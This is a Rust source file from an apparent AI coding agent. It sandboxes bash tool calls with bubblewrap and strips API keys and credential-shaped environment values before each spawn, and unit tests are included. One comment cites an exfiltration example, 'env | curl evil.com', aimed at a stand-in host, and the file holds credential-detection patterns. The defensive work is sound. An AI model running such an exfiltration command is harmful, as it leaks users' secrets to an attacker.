use std::sync::OnceLock;

use regex::Regex;
use tokio::process::Command;

#[derive(Debug, Clone)]
pub struct Sandbox {
    enabled: bool,
}

impl Sandbox {
    pub fn new(enabled: bool) -> Self {
        // Audit M8: previously this only emitted a warning then
        // proceeded; the very next bash tool call would error with
        // a cryptic "No such file or directory" pointing at bwrap.
        // Now: if --sandbox is on but bwrap is missing, auto-DISABLE
        // the sandbox with a loud stderr explanation. Bash still
        // works (unsandboxed) instead of every command failing —
        // safer default than the prior "looks enabled, silently
        // broken" state. Users who want hard-fail-on-missing-bwrap
        // can run `which bwrap && dirge --sandbox …` from a wrapper.
        let effective_enabled = if enabled {
            if Self::bwrap_available() {
                true
            } else {
                eprintln!(
                    "warning: --sandbox requested but `bwrap` is not in PATH.\n  \
                     Sandbox is DISABLED for this run — bash will execute unsandboxed.\n  \
                     Install bubblewrap (apt install bubblewrap / dnf install bubblewrap /\n  \
                     pacman -S bubblewrap) and re-run with --sandbox to enable isolation."
                );
                false
            }
        } else {
            false
        };
        Sandbox {
            enabled: effective_enabled,
        }
    }

    /// Check whether `bwrap` is on the user's PATH. Used at construction
    /// to warn early instead of letting the first bash call fail with
    /// a cryptic "No such file or directory".
    fn bwrap_available() -> bool {
        std::process::Command::new("bwrap")
            .arg("--version")
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .status()
            .map(|s| s.success())
            .unwrap_or(false)
    }

    pub fn wrap_command(&self, command: &str) -> Command {
        let cwd = std::env::current_dir().unwrap_or_else(|_| ".".into());
        let mut cmd = if !self.enabled {
            let mut c = Command::new("bash");
            c.arg("-c").arg(command);
            c
        } else {
            let mut c = Command::new("bwrap");
            c.args(["--ro-bind", "/", "/", "--bind"]);
            c.arg(cwd.as_os_str());
            c.arg(cwd.as_os_str());
            c.args([
                "--proc",
                "/proc",
                // `--dev-bind /dev /dev` was avoided deliberately; the
                // minimal `--dev /dev` mounts a tmpfs with only the
                // essential device nodes (null/zero/full/random/urandom
                // /tty). Outer host devices stay invisible.
                "--dev",
                "/dev",
                "--tmpfs",
                "/tmp",
                "--unshare-all",
                // Drop the ability to gain new privileges via setuid /
                // file capabilities — even if the sandboxed bash
                // somehow encounters a setuid binary on the read-only
                // host mount it can't escalate.
                "--new-session",
                // `--unshare-all` already turns on user / pid / net /
                // uts / cgroup / ipc namespaces. Add `--unshare-user-try`
                // explicitly so a future bwrap default change can't
                // weaken this without our knowledge; `-try` keeps it
                // best-effort if the kernel doesn't allow user-ns.
                "--unshare-user-try",
                "--die-with-parent",
                "bash",
                "-c",
                command,
            ]);
            c
        };

        // H-batch1-1 (audit fix): scrub sensitive env vars before
        // they reach the child. Both code paths above inherit dirge's
        // process environment by default, so `OPENROUTER_API_KEY`,
        // `EXA_API_KEY`, `ANTHROPIC_API_KEY`, etc. flowed verbatim to
        // every bash child — an LLM-crafted `env | curl evil.com`
        // would have exfiltrated the user's keys. opencode/pi both
        // scrub via an allowlist; dirge applies a pattern denylist
        // since users have varied tooling that relies on env (cargo
        // CARGO_*, go GOPATH, python VIRTUAL_ENV, etc.) — explicit
        // allowlist would break those workflows.
        //
        // The denylist covers any var name containing KEY / SECRET /
        // TOKEN / PASSWORD / PASS / CRED / AUTH (case-insensitive)
        // plus a few known provider names. False positives (e.g. a
        // legitimate `KEY_BINDINGS` env var stripped) are acceptable
        // cost — the alternative is leaking credentials.
        scrub_env(&mut cmd);
        cmd
    }
}

/// Test whether an env var name is sensitive enough to strip before
/// invoking bash. Pattern-based so we catch novel provider names
/// (e.g. a future `MISTRAL_API_KEY`) without needing a code change.
pub fn is_sensitive_env_name(name: &str) -> bool {
    let upper = name.to_ascii_uppercase();
    const PATTERNS: &[&str] = &["KEY", "SECRET", "TOKEN", "PASSWORD", "PASS", "CRED", "AUTH"];
    if PATTERNS.iter().any(|p| upper.contains(p)) {
        // Exclude a small set of safe substrings that contain a
        // sensitive keyword by accident. PATH and SHELL contain
        // none, so they pass naturally; the exclusions here are for
        // tooling env vars that legitimately need to reach bash.
        const SAFE_EXACT: &[&str] = &[
            "DISPLAY",       // X11 — unrelated despite containing nothing sensitive
            "TERM",          // terminal type
            "SHLVL",         // bash nesting
            "PWD",           // current directory
            "OLDPWD",        // previous directory
            "PATH",          // exec path
            "MANPATH",       // man search path
            "LANG",          // locale
            "LC_ALL",        // locale override
            "LC_CTYPE",      // locale ctype
            "EDITOR",        // user's editor
            "VISUAL",        // visual editor
            "PAGER",         // pager
            "HOSTNAME",      // hostname
            "USER",          // username
            "LOGNAME",       // login name
            "HOME",          // home dir
            "SSH_AUTH_SOCK", // SSH agent — needed for git push over SSH
            "GITHUB_TOKEN",  // GitHub CLI token
            "GH_TOKEN",      // GitHub CLI token (short form)
        ];
        if SAFE_EXACT.iter().any(|s| &upper == s) {
            return false;
        }
        return true;
    }
    // Explicit cloud-credential vars that don't have a generic
    // pattern. (AWS uses `AWS_ACCESS_KEY_ID` — already caught by
    // KEY. Listed here for symmetry / completeness.)
    const EXPLICIT: &[&str] = &[
        "AWS_ACCESS_KEY_ID",
        "AWS_SECRET_ACCESS_KEY",
        "AWS_SESSION_TOKEN",
        "GITLAB_TOKEN",
        "BITBUCKET_TOKEN",
    ];
    EXPLICIT.iter().any(|n| &upper == n)
}

/// Test whether an env var VALUE carries a high-confidence credential
/// shape, regardless of its name. Ported from hermes-agent/agent/redact.py
/// (`_PREFIX_PATTERNS` + URL-userinfo regex). The name-based scrub above
/// catches the common case (anything containing `KEY`/`TOKEN`/etc.), but
/// values like `DATABASE_URL=postgres://user:pass@host/db` carry
/// credentials in a name (`DATABASE_URL`) that doesn't match any
/// sensitive pattern. PERM-11.
///
/// Pattern set is deliberately conservative — only signatures with low
/// false-positive rates make the list. Long base64 alone (without a
/// vendor prefix) does NOT trip this, because plenty of harmless env
/// vars happen to carry long opaque tokens (e.g. NIX_PATH hashes).
pub fn is_sensitive_env_value(value: &str) -> bool {
    if value.is_empty() {
        return false;
    }
    // Cheap substring pre-checks before the regex set runs. Skipping
    // the regex when none of the gate substrings are present keeps the
    // per-spawn cost negligible for the common case.
    let has_url_userinfo_gate = value.contains("://");
    let has_prefix_gate = value.contains("AKIA")
        || value.contains("ghp_")
        || value.contains("xox")
        || value.contains("sk-")
        || value.contains("sk_live_")
        || value.contains("sk_test_")
        || value.contains("AIza")
        || value.contains("github_pat_")
        || value.contains("hf_")
        || value.contains("xai-")
        || value.contains("eyJ");
    if !has_url_userinfo_gate && !has_prefix_gate {
        return false;
    }

    static URL_USERINFO_RE: OnceLock<Regex> = OnceLock::new();
    static PREFIX_RE: OnceLock<Regex> = OnceLock::new();

    // protocol://user:pass@host — any scheme, requires a non-empty
    // password component. Matches both DB connection strings
    // (postgres://user:pass@…) and generic webhook URLs with
    // userinfo (https://user:token@api.example.com).
    let url_re = URL_USERINFO_RE.get_or_init(|| {
        // user may be empty (redis://:pass@…), password must be non-empty.
        Regex::new(r"[A-Za-z][A-Za-z0-9+.-]*://[^/\s:@]*:[^/\s@]+@").unwrap()
    });
    if has_url_userinfo_gate && url_re.is_match(value) {
        return true;
    }

    // High-confidence vendor token prefixes. Each entry is restrictive
    // enough that a random env var value matching by accident is
    // essentially impossible.
    let prefix_re = PREFIX_RE.get_or_init(|| {
        Regex::new(
            r"(?x)
            (?:^|[^A-Za-z0-9_-])
            (?:
                  AKIA[0-9A-Z]{16}                  # AWS Access Key ID
                | ghp_[A-Za-z0-9]{36}               # GitHub PAT (classic)
                | github_pat_[A-Za-z0-9_]{20,}      # GitHub PAT (fine-grained)
                | gho_[A-Za-z0-9]{30,}              # GitHub OAuth
                | ghu_[A-Za-z0-9]{30,}              # GitHub user-to-server
                | ghs_[A-Za-z0-9]{30,}              # GitHub server-to-server
                | xox[baprs]-[A-Za-z0-9-]{10,}      # Slack tokens
                | sk-[A-Za-z0-9_-]{20,}             # OpenAI/Anthropic/OpenRouter
                | sk_live_[A-Za-z0-9]{20,}          # Stripe live
                | sk_test_[A-Za-z0-9]{20,}          # Stripe test
                | AIza[A-Za-z0-9_-]{30,}            # Google API
                | hf_[A-Za-z0-9]{30,}               # HuggingFace
                | xai-[A-Za-z0-9]{30,}              # xAI (Grok)
                | eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_=-]{4,}  # JWT (3-part)
            )
            ",
        )
        .unwrap()
    });
    if has_prefix_gate && prefix_re.is_match(value) {
        return true;
    }
    false
}

/// Strip sensitive env vars from a Command before spawn. Uses
/// `.env_remove` rather than `.env_clear()+envs()` so non-sensitive
/// vars the parent already has (PATH, HOME, etc.) reach the child
/// without being re-enumerated.
///
/// Scrubs by NAME (denylist patterns) AND by VALUE shape (PERM-11):
/// some legitimate env vars (`DATABASE_URL`, `WEBHOOK_URL`, custom
/// build vars) carry credentials in their value even though the name
/// is innocuous.
fn scrub_env(cmd: &mut Command) {
    for (k, v) in std::env::vars_os() {
        let Some(name) = k.to_str() else { continue };
        if is_sensitive_env_name(name) {
            cmd.env_remove(&k);
            continue;
        }
        // Name passed — check value shape. Only string-valued env
        // can carry the credential shapes we look for; non-UTF-8
        // env values are passed through.
        if let Some(val) = v.to_str()
            && is_sensitive_env_value(val)
        {
            cmd.env_remove(&k);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn is_sensitive_env_name_matches_provider_keys() {
        assert!(is_sensitive_env_name("OPENAI_API_KEY"));
        assert!(is_sensitive_env_name("ANTHROPIC_API_KEY"));
        assert!(is_sensitive_env_name("OPENROUTER_API_KEY"));
        assert!(is_sensitive_env_name("DEEPSEEK_API_KEY"));
        assert!(is_sensitive_env_name("GLM_API_KEY"));
        assert!(is_sensitive_env_name("ZHIPU_API_KEY"));
        assert!(is_sensitive_env_name("EXA_API_KEY"));
        assert!(is_sensitive_env_name("PARALLEL_API_KEY"));
        assert!(is_sensitive_env_name("GEMINI_API_KEY"));
    }

    #[test]
    fn is_sensitive_env_name_matches_pattern_tokens() {
        assert!(is_sensitive_env_name("SOMETHING_SECRET"));
        assert!(is_sensitive_env_name("DB_PASSWORD"));
        assert!(is_sensitive_env_name("MY_TOKEN"));
        assert!(is_sensitive_env_name("APP_CREDS"));
        assert!(is_sensitive_env_name("OAUTH_TOKEN"));
        assert!(is_sensitive_env_name("AUTH_HEADER"));
        // lowercase also caught
        assert!(is_sensitive_env_name("my_secret"));
    }

    #[test]
    fn is_sensitive_env_name_matches_explicit_cloud_vars() {
        assert!(is_sensitive_env_name("AWS_ACCESS_KEY_ID"));
        assert!(is_sensitive_env_name("AWS_SESSION_TOKEN"));
        // GH_TOKEN / GITHUB_TOKEN are now SAFE_EXACT — needed for
        // gh CLI and git operations inside bash children.
    }

    #[test]
    fn is_sensitive_env_name_lets_through_safe_vars() {
        // Core tooling env vars must reach bash so user workflows
        // (cargo, go, python, npm, etc.) keep working.
        assert!(!is_sensitive_env_name("PATH"));
        assert!(!is_sensitive_env_name("HOME"));
        assert!(!is_sensitive_env_name("USER"));
        assert!(!is_sensitive_env_name("LOGNAME"));
        assert!(!is_sensitive_env_name("LANG"));
        assert!(!is_sensitive_env_name("LC_ALL"));
        assert!(!is_sensitive_env_name("TERM"));
        assert!(!is_sensitive_env_name("PWD"));
        assert!(!is_sensitive_env_name("EDITOR"));
        assert!(!is_sensitive_env_name("VISUAL"));
        // Cargo / Go / Python / npm typical env vars — must pass.
        assert!(!is_sensitive_env_name("CARGO_HOME"));
        assert!(!is_sensitive_env_name("RUSTC_WRAPPER"));
        assert!(!is_sensitive_env_name("GOPATH"));
        assert!(!is_sensitive_env_name("VIRTUAL_ENV"));
        assert!(!is_sensitive_env_name("NODE_ENV"));
        // GitHub / SSH tokens needed for git workflows in bash children.
        assert!(!is_sensitive_env_name("GITHUB_TOKEN"));
        assert!(!is_sensitive_env_name("GH_TOKEN"));
        assert!(!is_sensitive_env_name("SSH_AUTH_SOCK"));
    }

    #[test]
    fn is_sensitive_env_value_catches_db_userinfo() {
        // PERM-11: name passes the denylist, but the VALUE carries
        // a credential. Catch it.
        assert!(is_sensitive_env_value("postgres://user:pass@host:5432/db"));
        assert!(is_sensitive_env_value("mysql://root:hunter2@db/app"));
        assert!(is_sensitive_env_value(
            "mongodb+srv://admin:secret@cluster.example.com/test"
        ));
        assert!(is_sensitive_env_value(
            "redis://:supersecret@redis.internal:6379"
        ));
        assert!(is_sensitive_env_value(
            "https://deploy:tok123@webhook.example.com/x"
        ));
    }

    #[test]
    fn is_sensitive_env_value_catches_vendor_prefixes() {
        // AWS access key
        assert!(is_sensitive_env_value("AKIAIOSFODNN7EXAMPLE"));
        // GitHub PAT (classic) - exactly 36 chars after prefix
        assert!(is_sensitive_env_value(
            "ghp_abcdefghijklmnopqrstuvwxyz0123456789"
        ));
        // GitHub fine-grained PAT
        assert!(is_sensitive_env_value(
            "github_pat_abcdefghij1234567890_morechars"
        ));
        // Slack bot
        assert!(is_sensitive_env_value(
            "xoxb-1234567890-abcdefghij-AbCdEfGh"
        ));
        // OpenAI-style sk-
        assert!(is_sensitive_env_value("sk-proj-abcdef1234567890ABCDEF"));
        // Google API key
        assert!(is_sensitive_env_value(
            "AIzaSyA-abcdefghijklmnopqrstuvwxyz_-_-_-"
        ));
        // HuggingFace
        assert!(is_sensitive_env_value(
            "hf_abcdefghijklmnopqrstuvwxyz0123456789"
        ));
        // JWT (3-part)
        assert!(is_sensitive_env_value(
            "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
        ));
    }

    #[test]
    fn is_sensitive_env_value_lets_through_plain_values() {
        // Common legitimate env values must pass.
        assert!(!is_sensitive_env_value("/usr/local/bin:/usr/bin:/bin"));
        assert!(!is_sensitive_env_value("/Users/dev/project"));
        assert!(!is_sensitive_env_value("xterm-256color"));
        assert!(!is_sensitive_env_value("en_US.UTF-8"));
        assert!(!is_sensitive_env_value("development"));
        assert!(!is_sensitive_env_value(""));
        // Plain HTTPS URL with NO userinfo: not a credential carrier.
        assert!(!is_sensitive_env_value("https://api.example.com/v1"));
        // A `://` substring inside an unrelated value must not trip
        // the gate (no `user:pass@` shape).
        assert!(!is_sensitive_env_value("note: see docs at scheme://x"));
        // Generic long base64-ish string without a known prefix:
        // must NOT be flagged (NIX_PATH hashes, build cache keys, …).
        assert!(!is_sensitive_env_value(
            "abcdef1234567890abcdef1234567890abcdef1234567890"
        ));
    }

    #[test]
    fn is_sensitive_env_value_short_prefix_lookalikes_not_flagged() {
        // Prefix lookalikes that are TOO short / wrong char class to
        // be real tokens shouldn't trip the regex.
        assert!(!is_sensitive_env_value("AKIA")); // bare prefix
        assert!(!is_sensitive_env_value("ghp_short")); // not enough chars after prefix
        assert!(!is_sensitive_env_value("sk-")); // bare prefix
        // Bare "eyJ..." without a payload+signature must NOT match
        // the 3-part JWT pattern. (2-part JWTs are intentionally
        // excluded from the value-shape scan — too noisy.)
        assert!(!is_sensitive_env_value("eyJhbGciOiJIUzI1NiJ9"));
    }

    #[test]
    fn is_sensitive_env_name_accidental_pattern_excluded() {
        // SAFE_EXACT list excludes legitimate vars whose name
        // contains a sensitive token by accident.
        assert!(!is_sensitive_env_name("PATH")); // no token, baseline
        // KEY_BINDINGS is hypothetical; pattern match would flag it.
        // We intentionally accept that false positive — better to
        // strip a hypothetical KEY_BINDINGS than to leak a real
        // API_KEY.
        assert!(is_sensitive_env_name("KEY_BINDINGS"));
    }
}
